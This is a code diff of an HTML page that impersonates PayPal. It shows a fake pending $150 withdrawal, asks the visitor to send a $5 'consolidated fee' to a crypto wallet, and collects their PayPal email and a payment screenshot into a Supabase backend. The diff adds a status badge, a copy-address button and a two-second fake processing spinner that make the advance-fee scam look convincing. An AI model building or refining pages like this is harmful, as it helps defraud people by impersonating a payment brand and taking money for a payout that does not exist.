@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Process Fee Payment & Verification</title>
+    <title>Withdrawal Processing & Payment</title>
     <!-- Supabase CDN -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
@@ -35,32 +35,99 @@
             border-radius: 12px;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
             box-sizing: border-box;
+            text-align: center;
         }
 
         .logo {
             font-size: 28px;
             font-weight: 800;
             color: var(--paypal-blue);
-            margin-bottom: 20px;
+            margin-bottom: 10px;
             letter-spacing: -1px;
-            text-align: center;
         }
 
         .logo span {
             color: var(--paypal-dark-blue);
         }
 
-        h2 {
-            font-size: 18px;
-            margin-bottom: 10px;
-            color: #333;
-            text-align: center;
+        /* Styling based on the reference layout */
+        .status-icon-container {
+            width: 65px;
+            height: 65px;
+            background: #fff8eb;
+            border: 2px solid #f39c12;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 15px auto;
         }
 
-        p {
-            font-size: 14px;
+        .status-icon-container svg {
+            width: 32px;
+            height: 32px;
+            fill: #f39c12;
+        }
+
+        h2 {
+            font-size: 20px;
+            margin-bottom: 5px;
+            color: #222;
+        }
+
+        p.subtitle {
+            font-size: 13px;
             color: #666;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+
+        .badge-pending {
+            display: inline-block;
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 4px 12px;
+            font-size: 12px;
+            font-weight: bold;
+            border-radius: 12px;
             margin-bottom: 20px;
+            border: 1px solid #ffeeba;
+        }
+
+        .summary-box {
+            background: #f8f9fa;
+            border: 1px solid #e1e8ed;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .summary-box .row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .summary-box .row:last-child {
+            margin-bottom: 0;
+        }
+
+        .summary-box .row strong {
+            color: var(--paypal-dark-blue);
+        }
+
+        .wallet-box {
+            background: #f1f4f8;
+            border: 1px solid #d1d9e0;
+            padding: 10px 12px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 13px;
+            color: #333;
+            word-break: break-all;
+            margin-bottom: 15px;
             text-align: center;
         }
 
@@ -77,7 +144,7 @@
             color: #444;
         }
 
-        input[type="file"], input[type="text"], input[type="email"] {
+        input[type="file"], input[type="email"] {
             width: 100%;
             padding: 12px 15px;
             border: 1px solid #ccc;
@@ -98,25 +165,46 @@
             border: none;
             width: 100%;
             padding: 14px;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
             border-radius: 25px;
             cursor: pointer;
             transition: background 0.3s ease;
             box-shadow: 0 2px 6px rgba(0, 112, 186, 0.3);
             margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-sizing: border-box;
         }
 
         .btn-paypal:hover {
             background-color: var(--paypal-dark-blue);
         }
 
-        .loader {
-            display: none;
-            text-align: center;
-            font-size: 14px;
-            color: var(--paypal-blue);
-            margin-top: 10px;
+        .btn-secondary {
+            background-color: #6c757d;
+            box-shadow: 0 2px 6px rgba(108, 117, 125, 0.3);
+        }
+
+        .btn-secondary:hover {
+            background-color: #5a6268;
+        }
+
+        /* Spinner Styles */
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s ease-in-out infinite;
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -124,23 +212,45 @@
 
     <div class="container">
         <div class="logo">Pay<span>Pal</span></div>
-        <h2>Processing Fee & Proof Upload</h2>
-        <p>Complete payment confirmation and upload your payment receipt or screenshot to finalize.</p>
 
-        <form id="paymentForm">
-            <div class="form-group">
-                <label for="userName">Full Name (John Daniel)</label>
-                <input type="text" id="userName" value="John Daniel" readonly>
+        <!-- Status Icon matching reference layout -->
+        <div class="status-icon-container">
+            <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+        </div>
+
+        <h2>Withdrawal Processing</h2>
+        <p class="subtitle">Your withdrawal request of <strong style="color:#000;">$150.00</strong> is currently under review.</p>
+        
+        <div>
+            <span class="badge-pending">⏳ PENDING</span>
+        </div>
+
+        <!-- Details Summary Box matching structure -->
+        <div class="summary-box">
+            <div class="row">
+                <span>Withdrawal Amount:</span>
+                <strong>$150.00 USD</strong>
             </div>
+            <div class="row">
+                <span>Consolidated Fee:</span>
+                <strong>$5.00 USD</strong>
+            </div>
+        </div>
 
+        <!-- Wallet / Destination Address Box -->
+        <div class="wallet-box" id="walletAddress">
+            0x7C3Effee94c4D79A951FC51f62201bD88785A
+        </div>
+
+        <button type="button" class="btn-paypal btn-secondary" id="copyBtn" onclick="copyAddress()">Copy Address</button>
+
+        <hr style="border:0; border-top:1px solid #eee; margin:20px 0;">
+
+        <!-- Form for uploading receipt & proof -->
+        <form id="paymentForm">
             <div class="form-group">
                 <label for="userEmail">PayPal Email</label>
                 <input type="email" id="userEmail" placeholder="Enter your email" required>
-            </div>
-
-            <div class="form-group">
-                <label for="feeAmount">Processing Fee ($ USD)</label>
-                <input type="text" id="feeAmount" value="$5.00 USD" readonly>
             </div>
 
             <div class="form-group">
@@ -148,12 +258,31 @@
                 <input type="file" id="paymentProof" accept="image/*" required>
             </div>
 
-            <button type="submit" class="btn-paypal" id="submitBtn">Submit Payment & Proof</button>
-            <div class="loader" id="loaderText">Uploading data to Supabase... Please wait.</div>
+            <button type="submit" class="btn-paypal" id="submitBtn">I've Sent the Payment</button>
         </form>
     </div>
 
     <script>
+        // Automatically grab email from URL parameter if passed from index.html
+        window.addEventListener('DOMContentLoaded', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const emailParam = urlParams.get('email');
+            if (emailParam) {
+                document.getElementById('userEmail').value = emailParam;
+            }
+        });
+
+        function copyAddress() {
+            const addressText = document.getElementById('walletAddress').innerText;
+            navigator.clipboard.writeText(addressText).then(() => {
+                const copyBtn = document.getElementById('copyBtn');
+                copyBtn.innerText = 'Copied to Clipboard!';
+                setTimeout(() => {
+                    copyBtn.innerText = 'Copy Address';
+                }, 2000);
+            });
+        }
+
         // REPLACE THESE WITH YOUR ACTUAL SUPABASE URL AND ANON KEY
         const SUPABASE_URL = 'YOUR_SUPABASE_URL_HERE';
         const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY_HERE';
@@ -167,7 +296,6 @@
             const email = document.getElementById('userEmail').value.trim();
             const fileInput = document.getElementById('paymentProof');
             const submitBtn = document.getElementById('submitBtn');
-            const loaderText = document.getElementById('loaderText');
 
             if (!fileInput.files.length) {
                 alert('Please upload a payment proof image.');
@@ -176,47 +304,50 @@
 
             const file = fileInput.files[0];
             const fileExt = file.name.split('.').pop();
-            const fileName = `${Date.now()}_${Math.random().toString(36.substring(2, 7))}.${fileExt}`;
+            const fileName = `${Date.now()}_${Math.random().toString(36).substring(2, 7)}.${fileExt}`;
             const filePath = `receipts/${fileName}`;
 
-            submitBtn.style.display = 'none';
-            loaderText.style.display = 'block';
+            // Show 2-second spinning animation before executing Supabase requests
+            submitBtn.innerHTML = '<span class="spinner"></span> Processing & Uploading...';
+            submitBtn.style.pointerEvents = 'none';
 
-            try {
-                // 1. Upload image to Supabase Storage bucket named 'payment-proofs'
-                const { data: uploadData, error: uploadError } = await supabaseClient.storage
-                    .from('payment-proofs')
-                    .upload(filePath, file);
+            setTimeout(async () => {
+                try {
+                    // 1. Upload image to Supabase Storage bucket named 'payment-proofs'
+                    const { data: uploadData, error: uploadError } = await supabaseClient.storage
+                        .from('payment-proofs')
+                        .upload(filePath, file);
 
-                if (uploadError) {
-                    throw uploadError;
+                    if (uploadError) {
+                        throw uploadError;
+                    }
+
+                    // 2. Save metadata record in a Supabase table named 'transactions'
+                    const { error: dbError } = await supabaseClient
+                        .from('transactions')
+                        .insert([
+                            { 
+                                name: 'John Daniel', 
+                                email: email, 
+                                amount_paid: '5.00', 
+                                proof_url: filePath 
+                            }
+                        ]);
+
+                    if (dbError) {
+                        console.warn('File uploaded, but database entry failed:', dbError.message);
+                    }
+
+                    alert('Payment proof submitted successfully! Your account will be credited shortly.');
+                    document.getElementById('paymentForm').reset();
+                    window.location.href = 'index.html';
+
+                } catch (error) {
+                    alert('Error uploading file: ' + error.message);
+                    submitBtn.innerHTML = "I've Sent the Payment";
+                    submitBtn.style.pointerEvents = 'auto';
                 }
-
-                // 2. (Optional) Save metadata record in a Supabase table named 'transactions'
-                const { error: dbError } = await supabaseClient
-                    .from('transactions')
-                    .insert([
-                        { 
-                            name: 'John Daniel', 
-                            email: email, 
-                            amount_paid: '5.00', 
-                            proof_url: filePath 
-                        }
-                    ]);
-
-                if (dbError) {
-                    console.warn('File uploaded, but database entry failed:', dbError.message);
-                }
-
-                alert('Payment proof submitted successfully! Your account will be credited shortly.');
-                document.getElementById('paymentForm').reset();
-                window.location.href = 'index.html'; // Go back or to success page
-
-            } catch (error) {
-                alert('Error uploading file: ' + error.message);
-                submitBtn.style.display = 'block';
-                loaderText.style.display = 'none';
-            }
+            }, 2000); // 2 seconds delay timer
         });
     </script>
 </body>
